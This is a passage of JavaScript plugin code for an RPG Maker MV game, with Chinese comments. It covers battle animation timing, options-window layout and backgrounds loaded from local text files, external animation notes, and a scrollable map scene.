'actionTargetList',
],true,true).add('createFollowActions',function f(){
	return this._createActions(f.tbl[0],f.tbl[1]);
},[
'follow',
'followActions',
],true,true).add('createFinishActions',function f(){
	return this._createActions(f.tbl[0],f.tbl[1]);
},[
'finish',
'finishActions',
],true,true).add('actSeqFrameMap_getCont',function f(){
	let rtv=this._actSeqFrameMap; if(!rtv) rtv=this._actSeqFrameMap=new Map();
	return rtv;
}).add('actSeqFrameMap_clearCont',function f(){
	this.actSeqFrameMap_getCont().clear();
}).add('actSeqFrameMap_getFrame',function f(btlr){
	return this.actSeqFrameMap_getCont().get(btlr)|0;
}).add('actSeqFrameMap_incFrame',function f(btlr){
	const m=this.actSeqFrameMap_getCont();
	const val=(m.get(btlr)|0)+1;
	m.set(btlr,val);
	return val;
}).add('updateActionList',function f(){
	this.updateAction_actAniInfo();
	const prelen=this._actionList.length;
	const rtv=f.ori.apply(this,arguments);
	this.updateAction_actSeqFrame(prelen);
	return rtv;
}).add('updateActionTargetList',function f(){
	this.updateAction_actAniInfo();
	const prelen=this._actionList.length;
	const rtv=f.ori.apply(this,arguments);
	this.updateAction_actSeqFrame(prelen);
	return rtv;
}).add('updateAction_actAniInfo',function f(){
	const lw=this._logWindow;
	if(lw){
		lw._actAniSubject=this._subject;
		lw._actAniList=this._actionList;
	}
}).add('updateAction_actSeqFrame',function f(prelen){
	if(this._actionList.length<prelen){
		this._actionList._curr=this._actSeq;
		this.actSeqFrameMap_incFrame(this._subject);
	}
}).add('processActionSequence',function f(){
	if(arguments[0]===f.tbl[0]){
		this._actSeq=[f.tbl[1],[this.registedPlayingAnimationSprite_getMax(this._actionList._anis)-f.tbl[2],]];
		arguments[0]=this._actSeq[0];
		arguments[1]=this._actSeq[1];
	}
	return f.ori.apply(this,arguments);
},[
'WAIT FOR ANIMATION',
'WAIT',
0,
]).add('setPreForceActionSettings',function f(){
	const rtv=f.ori.apply(this,arguments);
	rtv.actionList=this._actionList;
	if(this._logWindow){
		rtv.waitCount=this._logWindow._waitCount;
		this._logWindow._waitCount=0;
	}else rtv.waitCount=0;
	return rtv;
}).add('resetPreForceActionSettings',function f(setting){
	const rtv=f.ori.apply(this,arguments);
	if(this._logWindow) this._logWindow._waitCount=setting.waitCount;
	return rtv;
}).add('registedPlayingAnimationSprite_add',function f(data){
	const actList=data&&data.opt&&data.opt.actAniList;
	if(actList){
		if(!actList._anis) actList._anis=new Set();
		actList._anis.add(data);
	}
}).add('registedPlayingAnimationSprite_del',function f(data){
	const actList=data&&data.opt&&data.opt.actAniList;
	if(actList && actList._anis) actList._anis.delete(data);
}).add('registedPlayingAnimationSprite_getMax',function f(anis){
	if(!anis) return 0;
	const rtv=[0,];
	anis.forEach(f.tbl[0].bind(rtv));
	return rtv[0];
},[
function(data){ if(data) this[0]=Math.max(this[0],data._usedBy?data._usedBy._delay+data._usedBy._duration:Sprite_Animation.prototype.calcTotalFrames(data)); },
]);

new cfc(Window_BattleLog.prototype).add('startAnimation_onsuccess',function f(addedCnt,trgt){
	const rtv=f.ori.apply(this,arguments);
	this.startAnimation_onsuccess_setActAniSubject(addedCnt,trgt);
	return rtv;
}).add('startAnimation_onsuccess_setActAniSubject',function f(addedCnt,trgt){
	if(!addedCnt||!trgt) return;
	const arr=trgt._animations;
	for(let x=arr.length-addedCnt;x<arr.length;++x){
		if(!arr[x].opt) arr[x].opt={};
		const opt=arr[x].opt;
		opt.actAniList=this._actAniList;
		opt.actAniFrame=BattleManager.actSeqFrameMap_getFrame(opt.actAniSubject=this._actAniSubject);
		opt.actAniLost=0;
		BattleManager.registedPlayingAnimationSprite_add(arr[x]);
	}
});

new cfc(Sprite_Base.prototype).add('startAnimation',function f(ani,mir,dly,r,opt){
	const rtv=f.ori.apply(this,arguments);
	const sp=this._animationSprites.back;
	sp._opt=opt;
	if(opt){ // loop-ani does not fill it
		let rotate=0;
		let scalex=1;
		let scaley=1;
		if((f.tbl[0][0] in opt) && opt.rotate!==0) rotate+=opt.rotate;
		if((f.tbl[0][1] in opt) && opt.scalex!==1) scalex*=opt.scalex;
		if((f.tbl[0][2] in opt) && opt.scaley!==1) scaley*=opt.scaley;
		// fixed effects
		if(rotate!==0) sp.rotation=opt.rotate;
		if(scalex!==1) sp.scale.x=opt.scalex;
		if(scaley!==1) sp.scale.y=opt.scaley;
		// dynamic effects
	}
	return rtv;
},[
Game_System.prototype.animationOptions_get.tbl[0].map(x=>x[0]),
]);

new cfc(Sprite_Animation.prototype).add('updateMain',function f(){
	if(!this.updateMain_checkActSeqSubjectPaused()){
		const rtv=f.ori.apply(this,arguments);
		if(!this.isPlaying()) BattleManager.registedPlayingAnimationSprite_del(this._settingData);
		return rtv;
	}
}).add('updateMain_checkActSeqSubjectPaused',function f(dontChange){
	let rtv=false;
	if(this._opt && this._opt.actAniList && this._opt.actAniList.length){
		rtv=true;
		const bm=BattleManager;
		const val=bm.actSeqFrameMap_getFrame(this._opt.actAniSubject);
		if(this._opt.actAniLost||this._opt.actAniFrame!==val){
			if(!dontChange){
				if(this._opt.actAniLost){
					--this._opt.actAniLost;
					this._opt.actAniLost+=val-this._opt.actAniFrame;
				}else this._opt.actAniLost+=val-this._opt.actAniFrame-1;
				this._opt.actAniFrame=val;
			}
			rtv=false;
		}else{
			if(this._opt.actAniList._curr && this._opt.actAniList._curr[0].match(f.tbl[2]) && this._opt.actAniWait!==this._opt.actAniList._curr){
				if(!dontChange){
					this._opt.actAniWait=this._opt.actAniList._curr;
					this._opt.actAniLost+=Math.max(this._opt.actAniList._curr[1][0]-1,0);
				}
				rtv=false;
			}
		}
	}
	return rtv;
},[
new Set(['actionList','actionTargetList',]),
function(setting){ return setting && this===setting.subject; },
/^wait$/i,
]);

})();


﻿"use strict";
/*:
 * @plugindesc ㄏㄏYEPㄏㄏ ( BattleManager._forceActionQueue 都不用存進遊戲存檔了還敢不手刻queue啊 )
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(BattleManager).add('initMembers',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._forceActionQueue=new Queue(this._forceActionQueue);
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc Window_Options txt 設定 x,y,w,h
 * @author agold404
 * @help txt 路徑：BLR_custom/OptionMenu/loc.txt 格式：
 * x=?
 * y=?
 * w=?
 * h=?
 * 
 * 沒填即預設值即不修改
 *
 * This plugin can be renamed as you want.
 */

if(0)(()=>{ let k,r,t;

t=[
'BLR_custom/OptionMenu/loc.txt',
/\r/g,
'\n',
];

new cfc(Scene_Options.prototype).add('initialize',function f(){
	if(Utils.isOptionValid('test')) ImageManager.otherFiles_delData(f.tbl[0]);
	ImageManager.otherFiles_addLoad(f.tbl[0]);
	return f.ori.apply(this,arguments);
},t);

new cfc(Window_Options.prototype).add('initialize',function f(){
	this.initInitLocMembers();
	this.updatePlacement_byTxt();
	this.initInitLocMembers();
	Window_Command.prototype.initialize.call(this, isNaN(this._initX)?0:this._initX, isNaN(this._initY)?0:this._initY, );
	this.updatePlacement();
	if(!isNaN(this._initX)) this.x=this._initX;
	if(!isNaN(this._initY)) this.y=this._initY;
},undefined,true,true).add('initInitLocMembers',function f(){
	this._initX-=0;
	this._initY-=0;
	this._windowWidth  -=0;
	this._windowHeight -=0;
}).add('updatePlacement_byTxt',function f(){
	const raw=ImageManager.otherFiles_getData(f.tbl[0]); if(!raw) return;
	raw.replace(f.tbl[1],'').split(f.tbl[2]).forEach(this.updatePlacement_setByLine,this);
},t).add('updatePlacement_setByLine',function f(line){
	const p=line.split(f.tbl[0]); if(!p[1]) return;
	const key=f.tbl[3].get(p[0].replace(f.tbl[1],f.tbl[2])),value=p[1]-0; if(!key||isNaN(value)) return;
	this[key]=value;
},[
/[ \t]*=[ \t]*/,
/^[ \t]*/,
'',
new Map([
['x','_initX',],
['y','_initY',],
['w','_windowWidth',],
['h','_windowHeight',],
]),
]).add('windowWidth',function f(){
	return isNaN(this._windowWidth  )?f.ori.apply(this,arguments):this._windowWidth  ;
}).add('windowHeight',function f(){
	return isNaN(this._windowHeight )?f.ori.apply(this,arguments):this._windowHeight ;
});

})();


﻿"use strict";
/*:
 * @plugindesc Window_Options txt 設定額外背景
 * @author agold404
 * @help txt 路徑：BLR_custom/OptionMenu/backgrounds.txt 格式：JSON
 * {"backgrounds":[
 *  {
 *   "isBelowWindow":boolean,
 *   "path":path_to_image_file,
 *   "x":x_coord_top_left_corner,
 *   "y":x_coord_top_left_corner,
 *   "sx":scale_x,
 *   "sy":scale_y,
 *   "alpha":alpha,
 *   "updateFunc":""
 *  },
 *   . . . . . .
 * ],"window":{
 *  "backgroundTone":[0,0,0,0],
 *  "backgroundType":0_1_2,
 *  "backgroundAlpha":0_to_1,
 *  "borderAlpha":0_to_1,
 *  "updateFunc":""
 * }}
 * 
 * JSON 可以怎麼換行或加空格或加其他屬性就怎麼做。預期缺項要沒事。
 * x,y沒填當0；sx,sy沒填當1。
 * 先出現在陣列中的在最上面。
 * 
 * compressed example: "LAKABA3gRARghgYwNYHMBOB7ArgOwCYDOUAXANqhiQWVQCWBAQgKYA2GA7gOq34ckBmcFgSYAaamCgAHOABcAFiToBbFAHpZtWSyYEAjGoAqWnQH0GLLEwCyGDDgAyTFE3wAlJsrhImAJgB0UjgoUOLgNAAeJAAMYZSSAJ4xcTQEUcR6KZIESRlZUEJS8nAx/r4ArPlYUnhyTABiuAhKABT8TZr2YPwtAJQQYGoAVGAAOjhgQ2qUw2Oyk9O0PQr0/qYwKACSOFoAvPu4eEz8PEx4/YMj4wszV/NTt3M3KwRrG9t7A7PXD5dPv997tM/qMgWAIsQXv4IqIQRMAXcbiCwcibglIfJVglYd94cDAUiCQ8AL4AbjhhMRCP+0yh6xQAGFZGg9LtouTcZSaWBiRTqaCbgBqQV0jZMlnkpYtUWM5l6AB8uwAnNFor0wDLxXoALTK1Ucq54x4Ch4IewEeZm5TKey7axyeT+AAKmyGviGmrlBrGRtRDyhEV2Mo+smhgvtCn8BB4LStNpwaj0AA41W7ygA2b0/fFU2mY14JIP5t5bHahhLaiOO6M4WMYa32NQAZlVvSG5T0vizvqJedWmFkdV2ccbABZfOy+dNib0oNRiSkIBI6IxWBxuLx2CRmVZ8jIFEpaKoNCZdL4NBh7TxAsFQsv0r49E38rlfG/8mkSM/lzkv/lCsUpQVFUNR1I0ODNMQUDtBBnQTD0/SeiyAA+bLksKSF6OSUIAXAuwtDqVb+GaBDSsW9Jamo6bptEQxES6bq9L0ajutE/gAOzlIKbEVKSxJzuEC7UEu4SSPQzBsFwPB4HwkJoLuy77ooUFHuomjaLoBjGBp5iWDYdiOM4rh4B4Xg+DeIT5Ok2qjtESYviQ2pNp2H4Ph+r7/iwRQlMQPGVMu1S1LIDRNEoAmUMSFAALqiFA7DSbJIk0PAyDoNg+CGPYTAkKQFSVHloixNEMXULAiCoJghyGAkUjZXkpUpRV6V4AAgl5gH1eEsAYGgRxoG13mlP5XWBWBoVQeFxKRSAQAAA=="
 * 
 * This plugin can be renamed as you want.
 */

if(0)(()=>{ let k,r,t;

t=[
'BLR_custom/OptionMenu/backgrounds.txt',
function f(){
	const rtv=Sprite.prototype.update.apply(this,arguments);
	if((typeof f)===(typeof this._customUpdate)) this._customUpdate();
	return rtv;
},
];

new cfc(Scene_Options.prototype).add('initialize',function f(){
	if(Utils.isOptionValid('test')) ImageManager.otherFiles_delData(f.tbl[0]);
	ImageManager.otherFiles_addLoad(f.tbl[0]);
	return f.ori.apply(this,arguments);
},t).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.create_applyConfig();
	return rtv;
}).add('create_applyConfig',function f(){
	const raw=ImageManager.otherFiles_getData(f.tbl[0]); if(!raw) return;
	const info=JSON.parse(raw);
	this.create_applyConfig_window(info);
	this.create_applyConfig_backgrounds(info);
},t).add('create_applyConfig_backgrounds',function f(info){
	const ow=this._optionsWindow;
	const idx=ow.children.indexOf(ow._windowCursorSprite);
	const bw=this._customBackgrounds_belowWindow=new Sprite();
	const bt=this._customBackgrounds_belowText=new Sprite();
	ow.addChildAt(bt,ow.children.indexOf(ow._windowCursorSprite));
	bt.x=-ow.x; bt.y=-ow.y;
	this.addChildAt(bw,this.children.indexOf(this._windowLayer));
	const bgs=info.backgrounds; if(!bgs) return;
	for(let x=bgs.length;x--;){
		if(!bgs[x]||!bgs[x].path||!(bgs[x].alpha-=0)||!(bgs[x].sx-=0)||!(bgs[x].sy-=0)) continue;
		const p=bgs[x].isBelowWindow?bw:bt;
		const sp=new Sprite(ImageManager.loadNormalBitmap(bgs[x].path));
		sp.x=bgs[x].x-ow.x||0;
		sp.y=bgs[x].y-ow.y||0;
		sp.alpha=bgs[x].alpha;
		const scl=sp.scale;
		scl.x=bgs[x].sx;
		scl.y=bgs[x].sy;
		if(bgs[x].updateFunc && (bgs[x].updateFunc=(bgs[x].updateFunc.constructor===String)?eval(bgs[x].updateFunc):bgs[x].updateFunc) ){
			sp.update=f.tbl[1];
			sp._customUpdate=bgs[x].updateFunc;
		}
		p.addChild(sp);
	}
},t).add('create_applyConfig_window',function f(info){
	if(!info.window) return;
	const ow=this._optionsWindow;
	if(!isNaN(info.window.backgroundType-=0)) ow.setBackgroundType(info.window.backgroundType);
	if(!isNaN(info.window.borderAlpha-=0) && ow._windowFrameSprite) ow._windowFrameSprite.alpha=info.window.borderAlpha;
	if(!isNaN(info.window.backgroundAlpha-=0) && ow._windowBackSprite) ow._windowBackSprite.alpha*=info.window.backgroundAlpha;
	if(info.window.backgroundTone&&info.window.backgroundTone.constructor===Array) ow._windowBackSprite.setColorTone(info.window.backgroundTone);
	if(info.window.updateFunc && (info.window.updateFunc=eval(info.window.updateFunc))) this._customUpdate=info.window.updateFunc;
},t).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	if((typeof f)===(typeof this._customUpdate)) this._customUpdate();
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 動畫外部note.txt
 * @author agold404
 * @help 名稱含有特定字串者套用。讀取 BLR_custom/Animations/AniNoteXXX.txt ， XXX 表動畫 id ，開頭不補 0 。
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

t=[
["BLR_custom/Animations/AniNote",".txt","",],
/^%%%/,
function f(dataobj){ return f.tbl[0][0]+dataobj.id+f.tbl[0][1]; },
function f(dataobj){
	const m=dataobj&&dataobj.name&&dataobj.name.match(f.tbl[1]); if(!m) return;
	ImageManager.otherFiles_addLoad(f.tbl[2](dataobj));
},
function f(dataobj){
	dataobj.note=ImageManager.otherFiles_getData(f.tbl[2](dataobj))||f.tbl[0][2];
	DataManager.extractMetadata(dataobj);
},
];
t.forEach(x=>x&&x.constructor===Function&&(x.tbl=x.ori=t));

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataAnimations.forEach(f.tbl[3]);
	return f.ori.apply(this,arguments);
},t);

new cfc(Sprite_Animation.prototype).add('setup',function f(target, animation, mirror, delay, rate){
	if(animation && !animation.meta) f.tbl[4](animation);
	return f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 設定動畫每幾幀更新成下一個畫面
 * @author agold404
 * @help 動畫外部note.txt中
 * 
 * <frameTime:整數>
 *
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Sprite_Animation.prototype).add('setup',function f(target, animation, mirror, delay, rate){
	const rtv=f.ori.apply(this,arguments);
	if(0<(animation.meta.frameTime|=0)){
		this._rate=animation.meta.frameTime;
		this.setupDuration();
	}
	return rtv;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 目前地圖的地圖
 * @author agold404
 * @help $gameScreen.handmap_show(比例尺);
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Temp.prototype).add('minimapBitmapCache_getCont',function f(){
	let rtv=this._minimapBitmapCache; if(!rtv) rtv=this._minimapBitmapCache=new Map();
	return rtv;
},t,false,true).add('minimapBitmapCache_get',function f(mapId){
	const cont=this.minimapBitmapCache_getCont();
	return cont.get(mapId);
},t,false,true).add('minimapBitmapCache_set',function f(mapId,bitmap){
	const cont=this.minimapBitmapCache_getCont();
	cont.set(mapId,bitmap);
},t,false,true);

new cfc(Game_Screen.prototype).add('handmap_show',function f(scale,isOperationDisabled,drawTimeoutMs){
	const sm=SceneManager; if(!sm._scene||sm._scene.constructor!==Scene_Map) return;
	const c=this.handmap_getConf();
	c.scale=scale===undefined?1:scale;
	c.drawTimeoutMs=drawTimeoutMs;
	this._handmap_isOperationDisabled=isOperationDisabled;
	sm.push(Scene_HandMap);
}).add('_handmap_getConf',function f(mapId){
	if(mapId===undefined) mapId=$gameMap&&$gameMap.mapId();
	if(!this._handmap) this._handmap={};
	if(!this._handmap[mapId]) this._handmap[mapId]={};
	return this._handmap[mapId];
}).add('handmap_getConf',function f(mapId){
	const conf=this._handmap_getConf(mapId);
	return this.handmap_setConf(conf.gx,conf.gy,conf.gw,conf.gh,conf.x,conf.y,conf.w,conf.h,); // prevent format changed for old saves
}).add('handmap_setConf',function f(gridX,gridY,gridW,gridH,x,y,w,h,mapId){
	if(!$gameMap) return console.warn('$gameMap invalid');
	if(gridX===undefined) gridX=$gameMap._displayX;
	if(gridY===undefined) gridY=$gameMap._displayY;
	if(gridW===undefined) gridW=$gameMap.screenTileX();
	if(gridH===undefined) gridH=$gameMap.screenTileY();
	if(x===undefined) x=0;
	if(y===undefined) y=0;
	if(w===undefined) w=Graphics.boxWidth;
	if(h===undefined) h=Graphics.boxHeight;
	
	const conf=this._handmap_getConf(mapId);
	conf.x=x;
	conf.y=y;
	conf.w=w;
	conf.h=h;
	conf.gx=gridX;
	conf.gy=gridY;
	conf.gw=gridW;
	conf.gh=gridH;
	return conf;
}).add('handmap_clearConf',function f(){
	if(!this._handmap) return;
	const mapId=$gameMap&&$gameMap.mapId();
	if(this._handmap[mapId]) delete this._handmap[mapId];
});

{ // Scene_HandMap
const a=function Scene_HandMap(){
	this.initialize.apply(this,arguments);
};
window[a.name]=a;
a.ori=Scene_Base;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
if(!Input.keyMapper[109]) Input.keyMapper[109]='NumPad-';
if(!Input.keyMapper[107]) Input.keyMapper[107]='NumPad+';
if(!Input.keyMapper[189]) Input.keyMapper[189]='-';
if(!Input.keyMapper[187]) Input.keyMapper[187]='+';
if(!Input.keyMapper["M".charCodeAt()]) Input.keyMapper["M".charCodeAt()]='m';
t=[
a.ori.prototype,
a.ori,
[Input.keyMapper[109],Input.keyMapper[189],], // -,numPad-
[Input.keyMapper[107],Input.keyMapper[187],], // +,numPad+
[1.0/256,0.5,2,], // wheelY scale , map scale * , map scale * ,
0.125, // map scale +
['img/system/IconSet.png',{
 x:(75&15)*Window_Base._iconWidth,
 y:(75>>4)*Window_Base._iconHeight,
 width:Window_Base._iconWidth,
 height:Window_Base._iconHeight,
}],
undefined, // 7:reserved: keySymbols for marker adjustments
undefined, // 8:reserved: keySymbols for marker adjustments
];
{ const c="M".charCodeAt(),km=Input.keyMapper; t[8]=km[c]=km[c]||'m';  }
new cfc(p).add('initialize',function f(){
	const rtv=f.tbl[0].initialize.apply(this,arguments);
	this._prevScene_store();
	this._conf=$gameScreen.handmap_getConf();
	if(this.init_minimap()) return;
	this._initX=this._conf.gx;
	this._initY=this._conf.gy;
	this._moveSpeed=0;
	const playerSp=SceneManager._scene._chr2sp.get($gamePlayer);
	const mm=this._minimap,anc=playerSp.anchor;
	this._playerX=$gameMap._displayX*mm._tileWidth  +playerSp.x +(0.5-anc.x)*playerSp.width  ;
	this._playerY=$gameMap._displayY*mm._tileHeight +playerSp.y +(0.5-anc.y)*playerSp.height ;
	this._playerFrm=this._getSpriteBitmapFrame(playerSp);
	this._playerBmp=playerSp.bitmap;
	this.init_mouseDown(true);
	this.showPopupMsg();
	return rtv;
},t,false,true).add('_getSpriteBitmapFrame',function f(sp){
	const frm=sp._frame; if(!frm) return console.warn('no _frame property'),new Rectangle();
	const ff=new Rectangle(frm.x,frm.y,frm.width,frm.height);
	if(!(ff.width&&ff.height)){
		if(sp._upperBody && sp._lowerBody){
			const spuf=sp._upperBody._frame,splf=sp._lowerBody._frame;
			const frmx0=Math.min(spuf.x,splf.x),frmx1=Math.max(spuf.x+spuf.width,splf.x+splf.width);
			const frmy0=Math.min(spuf.y,splf.y),frmy1=Math.max(spuf.y+spuf.height,splf.y+splf.height);
			ff.x=frmx0; ff.width=frmx1-frmx0;
			ff.y=frmy0; ff.height=frmy1-frmy0;
		}
		if(!(ff.width&&ff.height) && sp.patternWidth && sp.patternHeight){
			ff.width=sp.patternWidth();
			ff.height=sp.patternHeight();
		}
	}
	return ff;
},t,false,true).add('init_minimap',function f(){
	this._minimap=new Sprite_Minimap();
	this._minimap._drawTimeoutMs=this._conf.drawTimeoutMs;
	if(!this._minimap._inited){
		this._minimap=undefined;
		return true;
	}
	this._setFrame_minimap();
},t,false,true).add('init_mouseDown',function f(loadBmp){
	if(loadBmp) this._mouseDownBmp=ImageManager.loadNormalBitmap(f.tbl[6][0]);
	this._mouseDownY=this._mouseDownX=undefined;
	if(this._mouseDown) this._mouseDown.visible=false;
},t,false,true).add('create',function f(){
	const rtv=f.tbl[0].create.apply(this,arguments);
	this._prevScene_restore();
	if(this.chkCondNotOk()){
		this.popScene();
		return rtv;
	}
	this.createMinimap();
	this.createPlayer();
	this.createMouseDown();
	return rtv;
},t,false,true).add('chkCondNotOk',function f(){
	return !this._minimap||!this._conf||!$gameMap;
},t,false,true).add('createMinimap',function f(){
	this.update_minimap();
	this.addChild(this._minimap);
},t,false,true).add('createPlayer',function f(){
	const sp=this._player=new Sprite(this._playerBmp);
	const frm=this._playerFrm,scl=sp.scale;
	sp.setFrame(frm.x,frm.y,frm.width,frm.height);
	sp.anchor.y=sp.anchor.x=0.5;
	this.update_player();
	this.addChild(sp);
},t,false,true).add('createMouseDown',function f(){
	const sp=this._mouseDown=new Sprite(this._mouseDownBmp);
	const frm=f.tbl[6][1];
	sp.setFrame(frm.x,frm.y,frm.width,frm.height);
	sp.anchor.y=sp.anchor.x=0.5;
	sp.visible=false;
	this.addChild(sp);
},t,false,true).add('getMouseDownSprite',function f(){
	if(!this._mouseDown) this.createMouseDown();
	return this._mouseDown;
}).add('showPopupMsg',function f(){
	if($gameScreen._handmap_isOperationDisabled) return;
	$gameTemp.popupMsg("使用上下左右移動，\n或使用滑鼠拖曳移動");
},t,false,true).add('_setFrame_minimap',function f(){
	const mm=this._minimap;
	const c=this._conf,tw=mm._tileWidth,th=mm._tileHeight;
	const s=c.scale;
	const w=c.gw*tw,h=c.gh*th;
	const ws=w/s,hs=h/s;
	mm.setFrame(c.gx*tw-(ws-w)*0.5,c.gy*th-(hs-h)*0.5,ws,hs);
	
	const scl=mm.scale;
	scl.x=c.w/ws;
	scl.y=c.h/hs;
},t,false,true).add('update',function f(){
	if(this.update_shouldEnd()) return;
	const rtv=f.tbl[0].update.apply(this,arguments);
	this.update_minimap();
	this.update_player();
	this.update_mouseDown();
	return rtv;
},t,false,true).add('update_shouldEnd',function f(){
	if($gameScreen._handmap_isOperationDisabled) return;
	if(Input.isTriggered(f.tbl[0])||TouchInput.isCancelled()){
		this.popScene();
		return true;
	}
},[
"cancel",
],false,true).add('update_minimapScale',function f(){
	let scl=0;
	if(Input.isTriggered(f.tbl[2][0])||Input.isTriggered(f.tbl[2][1])) --scl;
	if(Input.isTriggered(f.tbl[3][0])||Input.isTriggered(f.tbl[3][1])) ++scl;
	scl-=TouchInput.wheelY*f.tbl[4][0];
	if(scl){
		const ori=this._conf.scale;
		if(Input.isPressed('shift')) this._conf.scale*=f.tbl[4][1+(scl<0)];
		else this._conf.scale+=f.tbl[5]*scl;
		if(!(0<this._conf.scale*ori)) this._conf.scale=ori;
	}
},t,false,true).add('update_minimap',function f(){
	this.update_minimapScale();
	const c=this._conf;
	const s=c.scale;
	const dspeed=f.tbl[1]/s;
	const gws=c.gw/s;
	const ghs=c.gh/s;
	const gwse=gws<0?1-Math.floor(gws):Math.ceil(gws)+1;
	const ghse=ghs<0?1-Math.floor(ghs):Math.ceil(ghs)+1;
	const gwd=(gws-c.gw)*0.5;
	const ghd=(ghs-c.gh)*0.5;
	let tmp;
	if(!this._moveSpeed) this._moveSpeed=dspeed;
	let changed=false,lr=0,ud=0;
if(!$gameScreen._handmap_isOperationDisabled){
	if(Input.isPressed(f.tbl[0][0])) ud+=this._moveSpeed;
	if(Input.isPressed(f.tbl[0][1])) lr-=this._moveSpeed;
	if(Input.isPressed(f.tbl[0][2])) lr+=this._moveSpeed;
	if(Input.isPressed(f.tbl[0][3])) ud-=this._moveSpeed;
	if(TouchInput.isReleased()) this.init_mouseDown();
	if(TouchInput.isPressed()){
		const dx=TouchInput.x-this._mouseDownX;
		const dy=TouchInput.y-this._mouseDownY;
		if(dx) lr+=dx/s*f.tbl[6];
		if(dy) ud+=dy/s*f.tbl[6];
		if(this._mouseDownX===undefined||this._mouseDownY===undefined){
			const mdsp=this.getMouseDownSprite();
			mdsp.x=this._mouseDownX=TouchInput.x;
			mdsp.y=this._mouseDownY=TouchInput.y;
			mdsp.visible=true;
		}
	}
}
	const nshift=!Input.isPressed(f.tbl[3]);
	if(lr||ud){
		const ogx=c.gx,ogy=c.gy;
		c.gx+=lr*(2-nshift);
		c.gy+=ud*(2-nshift);
		if(!lr) ;
		else if(lr<0){ if(c.gx<gwd) c.gx=Math.min(ogx,gwd); }
		else{ tmp=$dataMap.width  -c.gw-gwd; if(c.gx>=tmp) c.gx=Math.max(ogx,tmp); }
		if(!ud) ;
		else if(ud<0){ if(c.gy<ghd) c.gy=Math.min(ogy,ghd); }
		else{ tmp=$dataMap.height -c.gh-ghd; if(c.gy>=tmp) c.gy=Math.max(ogy,tmp); }
		changed=true;
	}
	if(Input.isTriggered('ok')){
		changed=false;
		c.gx=this._initX;
		c.gy=this._initY;
	}
	if(changed) this._moveSpeed+=dspeed*( f.tbl[2]-(nshift<<f.tbl[4]) );
	else this._moveSpeed=dspeed;
	tmp=Math.max(Math.min(gwse,ghse)>>f.tbl[5],1); if(this._moveSpeed>=tmp) this._moveSpeed=tmp;
	this._minimap.paintAll(Math.floor(c.gx-gwd),Math.floor(c.gy-ghd),gwse,ghse);
	this._setFrame_minimap();
},[
['down','left','right','up',],
1.0/64,
3,
'shift',
1,
2,
1.0/256,
]).add('update_player',function f(){
	const sp=this._player;
	if(Input.isTriggered(f.tbl[3][0])) sp.visible=!sp.visible;
	if(!sp.visible) return;
	const s=this._conf.scale;
	const frm=this._minimap._frame;
	const x=(this._playerX-frm.x)*s,y=(this._playerY-frm.y)*s;
	sp.x=x.clamp(0,Graphics.boxWidth  );
	sp.y=y.clamp(0,Graphics.boxHeight );
	const scl=sp.scale;
	const dx=sp.x-x,dy=sp.y-y;
	const d2=dx*dx+dy*dy;
	scl.y=scl.x=d2?f.tbl[0]-(f.tbl[0]-f.tbl[1])*Math.exp(f.tbl[2]*-d2):f.tbl[1];
},[
4,
1,
1.0/65536,
t[8],
]).add('update_mouseDown',function f(){
	if(!this._mouseDown.visible) return;
	if(!(++this._mouseDown._ctr<f.tbl[0])) this._mouseDown._ctr=0;
	this._mouseDown.rotation=this._mouseDown._ctr/f.tbl[0]*f.tbl[1];
},[
120,
Math.PI*2,
]).add('terminate',function f(){
	this._conf.gx=this._initX;
	this._conf.gy=this._initY;
	return f.tbl[0].terminate.apply(this,arguments);
},t,false,true);
} // Scene_Minimap

{ // Sprite_Minimap
const a=function Sprite_Minimap(){
	this.initialize.apply(this,arguments);
};
window[a.name]=a;
a.ori=Sprite_Base;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
t=[
a.ori.prototype,
a.ori,
[
()=>$gameMap.tileWidth(),
()=>$gameMap.tileHeight(),
], // 2: tile size [w,h] ; if this become non const, update it in initData()
[
()=>($gameMap.screenTileX()<<1)|1,
()=>($gameMap.screenTileY()<<1)|1,
], // 3: max draw X,Y
function gcd(a,b){ return b?gcd(b, a % b):a; }, // 4: gcd
];
p.isMapValid=function(){
	return $dataMap && $gameMap && $gameMap.mapId() && $gamePlayer && !$gamePlayer.isTransferring();
};
new cfc(p).add('initialize',function f(){
	const rtv=f.tbl[0].initialize.apply(this,arguments);
	this.initData();
	return rtv;
},t).add('initData',function f(){ // return false-like if no error
	if(this._inited) return; // not an error
	if(!this.isMapValid()) return true;
	{
		const sc=SceneManager._scene; 
		const sps=sc&&sc._spriteset;
		const tm=sps&&sps._tilemap;
		if(!tm) return true;
		this.bitmaps=tm.bitmaps;
		this.flags=tm.flags;
	}
	
	this._tileWidth=f.tbl[2][0]();
	this._tileHeight=f.tbl[2][1]();
	
	let bmp=$gameTemp.minimapBitmapCache_get($gameMap.mapId());
	if(!bmp){
		$gameTemp.minimapBitmapCache_set($gameMap.mapId(),bmp=new Bitmap($dataMap.width*this._tileWidth,$dataMap.height*this._tileHeight));
		(bmp._painted=[]).length=$dataMap.width*$dataMap.height;
	}
	
	this.bitmap=bmp;
	this._painted=bmp._painted;
	
	this._inited=true;
},t).add('painted',function f(x,y){
	if(this.initData()) return;
	return this._painted[y*$dataMap.width+x];
}).add('painted_setVal',function f(x,y,value){
	if(this.initData()) return;
	return this._painted[y*$dataMap.width+x]=value;
}).add('painted_clear',function f(){
	if(this.initData()) return;
	this._painted.length=0;
	this._painted.length=$dataMap.width*$dataMap.height;
}).add('paintAll',function f(x,y,w,h){
	// unit: grid
	if(this.initData()) return;
	if(x===undefined||x<0) x=0;
	if(y===undefined||y<0) y=0;
	if(w===undefined||(w>=$dataMap.width  -x)) w=$dataMap.width  -x;
	if(h===undefined||(h>=$dataMap.height -y)) h=$dataMap.height -y;
	
